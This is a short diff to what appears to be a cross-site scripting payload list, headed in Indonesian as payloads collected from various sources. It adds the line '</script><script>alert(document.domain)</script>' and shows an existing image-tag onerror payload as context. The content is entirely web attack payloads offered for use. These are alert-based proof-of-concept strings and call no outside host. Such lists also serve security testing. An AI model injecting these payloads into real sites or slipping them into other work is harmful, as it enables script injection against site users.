@@ -2,6 +2,7 @@
         PAYLOAD XSS 
 PAYLOAD INI DIDAPATKAN DARI BERBAGAI SUMBER YANG DITEMUKAN OLEH PENULIS
 -----------------------------------------------------------------------
+</script><script>alert(document.domain)</script>
 
 <Img Src=\" OnError=alert(1)//\">
 
